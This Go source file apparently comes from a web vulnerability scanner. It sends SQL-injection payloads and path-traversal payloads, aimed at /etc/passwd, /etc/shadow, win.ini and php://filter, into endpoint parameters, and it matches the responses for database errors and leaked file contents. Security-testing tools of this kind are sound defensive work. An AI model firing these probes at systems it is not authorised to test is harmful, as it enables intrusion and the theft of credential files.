package epanalyze

import (
	"context"
	"encoding/base64"
	"net/url"
	"regexp"
	"strings"
)

// ---- SQL injection signatures (error-based) ----

type sqlErrSig struct {
	dbms string
	rx   *regexp.Regexp
}

var sqlErrSigs = []sqlErrSig{
	{"MySQL", regexp.MustCompile(`(?i)SQL syntax.*?(MySQL|MariaDB)|check the manual that corresponds to your (MySQL|MariaDB)|MySqlException|valid MySQL result|com\.mysql\.jdbc|Unknown column '[^']+' in 'field list'|You have an error in your SQL syntax`)},
	{"PostgreSQL", regexp.MustCompile(`(?i)PostgreSQL.*?ERROR|pg_query\(\)|pg_exec\(\)|Npgsql\.|PG::(Syntax|Undefined)Error|org\.postgresql\.util\.PSQLException|unterminated quoted string at or near`)},
	{"Microsoft SQL Server", regexp.MustCompile(`(?i)Unclosed quotation mark after the character string|Microsoft SQL (Native Client|Server)|System\.Data\.SqlClient\.SqlException|Incorrect syntax near|OLE DB.*?SQL Server|\bSQL Server[^&<>]*?Driver|Warning.*?mssql_`)},
	{"Oracle", regexp.MustCompile(`(?i)\bORA-[0-9]{4,5}\b|Oracle error|Oracle.*?Driver|quoted string not properly terminated|oci_(parse|execute)`)},
	{"SQLite", regexp.MustCompile(`(?i)SQLite/JDBCDriver|SQLite\.Exception|System\.Data\.SQLite\.SQLiteException|Warning.*?sqlite_|\[SQLITE_ERROR\]|sqlite3?\.OperationalError|unrecognized token:|near ".+?": syntax error`)},
	{"Generic", regexp.MustCompile(`(?i)Microsoft OLE DB Provider for ODBC Drivers|java\.sql\.SQLException|SQLSTATE\[|Dynamic SQL Error|com\.ibm\.db2\.jcc|DB2 SQL error|Sybase message`)},
}

// Payloads appended to an existing parameter value to trigger SQL errors.
var sqlErrorPayloads = []string{`'`, `"`, `')`, `')--`, `';`, "`", `\`, `'"`, `' OR '1`}

// ---- LFI / path-traversal signatures + payloads ----

type lfiSig struct {
	name string
	rx   *regexp.Regexp
}

var lfiSigs = []lfiSig{
	{"/etc/passwd", regexp.MustCompile(`(?m)^[a-z_][a-z0-9_\-]{0,30}:[^:\n]*:\d+:\d+:[^:\n]*:[^:\n]*:[^:\n]*$`)},
	{"Windows win.ini", regexp.MustCompile(`(?i)\[(fonts|extensions|mci extensions|files)\]|for 16-bit app support`)},
	{"/etc/shadow", regexp.MustCompile(`(?m)^[a-z_][a-z0-9_\-]{0,30}:[!*]?\$[0-9a-z]\$`)},
	{"PHP source (php://filter)", regexp.MustCompile(`PD9waH|PD9wT"|PHA+`)},
}

// Traversal + wrapper payloads. %s detection signatures decide success.
var lfiPayloads = []string{
	"../../../../../../../../../../etc/passwd",
	"....//....//....//....//....//....//etc/passwd",
	"..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd",
	"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
	"/etc/passwd",
	"../../../../../../../../../../etc/passwd%00",
	"..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
	"..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini",
	"file:///etc/passwd",
	"php://filter/convert.base64-encode/resource=index.php",
}

// ---- probing logic ----

func appendParam(rawURL, param, suffix string) string {
	u, err := url.Parse(rawURL)
	if err != nil {
		return rawURL
	}
	q := u.Query()
	q.Set(param, q.Get(param)+suffix)
	u.RawQuery = q.Encode()
	return u.String()
}

func paramsForCategories(e *Endpoint, cats ...string) []string {
	want := map[string]bool{}
	for _, v := range e.Vulns {
		for _, c := range cats {
			if v.Category == c {
				for _, p := range v.Params {
					want[p] = true
				}
			}
		}
	}
	var out []string
	for _, p := range e.Params {
		if want[p] {
			out = append(out, p)
		}
	}
	if len(out) == 0 { // no targeted hit — fall back to every param
		out = e.Params
	}
	if len(out) > 10 {
		out = out[:10]
	}
	return out
}

// sqliTests runs error-based then boolean-based SQLi probing.
func (p *Prober) sqliTests(ctx context.Context, e *Endpoint, baseline string, baseStatus int) {
	for _, param := range paramsForCategories(e, "SQL Injection", "IDOR / BOLA") {
		if p.sqliErrorBased(ctx, e, param, baseline) {
			continue // confirmed; move to next param
		}
		p.sqliBoolean(ctx, e, param, baseline, baseStatus)
	}
}

func (p *Prober) sqliErrorBased(ctx context.Context, e *Endpoint, param, baseline string) bool {
	baseHasErr, _, _ := matchSQLError(baseline)
	if baseHasErr {
		return false // page already shows SQL errors normally; unreliable
	}
	for _, payload := range sqlErrorPayloads {
		select {
		case <-ctx.Done():
			return false
		default:
		}
		inj := appendParam(e.URL, param, payload)
		body, _, _, ok := p.get(ctx, inj)
		if !ok {
			continue
		}
		if hit, dbms, ev := matchSQLError(body); hit {
			e.confirm(ConfirmedVuln{
				Category: "SQL Injection (error-based)",
				Param:    param,
				Payload:  param + "=…" + payload,
				URL:      inj,
				Evidence: ev,
				Detail:   "DBMS: " + dbms,
			})
			return true
		}
	}
	return false
}

func (p *Prober) sqliBoolean(ctx context.Context, e *Endpoint, param, baseline string, baseStatus int) {
	// (numeric context, string context)
	pairs := [][2]string{
		{" AND 1=1", " AND 1=2"},
		{"' AND '1'='1", "' AND '1'='2"},
		{" OR 1=1-- -", " OR 1=2-- -"},
	}
	for _, pr := range pairs {
		select {
		case <-ctx.Done():
			return
		default:
		}
		trueBody, _, trueStatus, ok1 := p.get(ctx, appendParam(e.URL, param, pr[0]))
		falseBody, _, _, ok2 := p.get(ctx, appendParam(e.URL, param, pr[1]))
		if !ok1 || !ok2 {
			continue
		}
		// Guard against pure reflection skewing lengths.
		if strings.Contains(trueBody, pr[0]) || strings.Contains(falseBody, pr[1]) {
			continue
		}
		if trueStatus == baseStatus &&
			similar(trueBody, baseline) &&
			!similar(falseBody, baseline) &&
			!similar(trueBody, falseBody) {
			e.confirm(ConfirmedVuln{
				Category: "SQL Injection (boolean-blind)",
				Param:    param,
				Payload:  param + "=…" + pr[0] + "  vs  " + pr[1],
				URL:      appendParam(e.URL, param, pr[0]),
				Evidence: lengthEvidence(baseline, trueBody, falseBody),
				Detail:   "TRUE condition matched baseline; FALSE diverged",
			})
			return
		}
	}
}

// lfiTests injects traversal/wrapper payloads and confirms via file content.
func (p *Prober) lfiTests(ctx context.Context, e *Endpoint, baseline string) {
	for _, param := range paramsForCategories(e, "LFI / Path Traversal", "File Operation") {
		for _, payload := range lfiPayloads {
			select {
			case <-ctx.Done():
				return
			default:
			}
			inj := withParam(e.URL, param, payload)
			body, _, _, ok := p.get(ctx, inj)
			if !ok {
				continue
			}
			if name, ev := matchLFI(baseline, body); name != "" {
				e.confirm(ConfirmedVuln{
					Category: "LFI / Path Traversal",
					Param:    param,
					Payload:  payload,
					URL:      inj,
					Evidence: ev,
					Detail:   "leaked: " + name,
				})
				break // this param is proven; next param
			}
		}
	}
}

// ---- matchers ----

func matchSQLError(body string) (bool, string, string) {
	for _, sig := range sqlErrSigs {
		if loc := sig.rx.FindStringIndex(body); loc != nil {
			return true, sig.dbms, snippet(body, loc[0], loc[1])
		}
	}
	return false, "", ""
}

func matchLFI(baseline, body string) (string, string) {
	for _, sig := range lfiSigs {
		loc := sig.rx.FindStringIndex(body)
		if loc == nil {
			continue
		}
		// Ignore content already present in the untampered baseline.
		if sig.rx.MatchString(baseline) {
			continue
		}
		switch sig.name {
		case "/etc/passwd", "/etc/shadow":
			lines := sig.rx.FindAllString(body, 4)
			return sig.name, strings.Join(lines, "  ⏎ ")
		case "PHP source (php://filter)":
			return sig.name, decodePHPFilter(body)
		default:
			return sig.name, snippet(body, loc[0], loc[1])
		}
	}
	return "", ""
}

func decodePHPFilter(body string) string {
	// Grab the longest base64-looking run and try to decode it.
	rx := regexp.MustCompile(`[A-Za-z0-9+/]{40,}={0,2}`)
	best := ""
	for _, m := range rx.FindAllString(body, -1) {
		if len(m) > len(best) {
			best = m
		}
	}
	if best == "" {
		return "base64-encoded PHP source returned"
	}
	if dec, err := base64.StdEncoding.DecodeString(padB64(best)); err == nil && len(dec) > 0 {
		s := strings.Map(func(r rune) rune {
			if r == '\n' || r == '\t' {
				return ' '
			}
			if r < 32 || r > 126 {
				return -1
			}
			return r
		}, string(dec))
		s = strings.TrimSpace(s)
		if len(s) > 160 {
			s = s[:160] + "…"
		}
		return "decoded source: " + s
	}
	if len(best) > 60 {
		best = best[:60] + "…"
	}
	return "base64 PHP source: " + best
}

func padB64(s string) string {
	if m := len(s) % 4; m != 0 {
		s += strings.Repeat("=", 4-m)
	}
	return s
}

// similar reports whether two response bodies are "the same page" by length.
func similar(a, b string) bool {
	la, lb := len(a), len(b)
	if la == 0 && lb == 0 {
		return true
	}
	diff := la - lb
	if diff < 0 {
		diff = -diff
	}
	tol := la / 50 // 2%
	if tol < 64 {
		tol = 64
	}
	return diff <= tol
}

func lengthEvidence(baseline, t, f string) string {
	return "response lengths — baseline:" + itoa(len(baseline)) +
		"  true:" + itoa(len(t)) + "  false:" + itoa(len(f))
}

func snippet(s string, start, end int) string {
	from := start - 30
	if from < 0 {
		from = 0
	}
	to := end + 90
	if to > len(s) {
		to = len(s)
	}
	out := s[from:to]
	out = strings.Map(func(r rune) rune {
		if r == '\n' || r == '\r' || r == '\t' {
			return ' '
		}
		if r < 32 {
			return -1
		}
		return r
	}, out)
	out = strings.TrimSpace(out)
	for strings.Contains(out, "  ") {
		out = strings.ReplaceAll(out, "  ", " ")
	}
	if len(out) > 200 {
		out = out[:200] + "…"
	}
	return out
}

func itoa(n int) string {
	if n == 0 {
		return "0"
	}
	neg := n < 0
	if neg {
		n = -n
	}
	var b [20]byte
	i := len(b)
	for n > 0 {
		i--
		b[i] = byte('0' + n%10)
		n /= 10
	}
	if neg {
		i--
		b[i] = '-'
	}
	return string(b[i:])
}
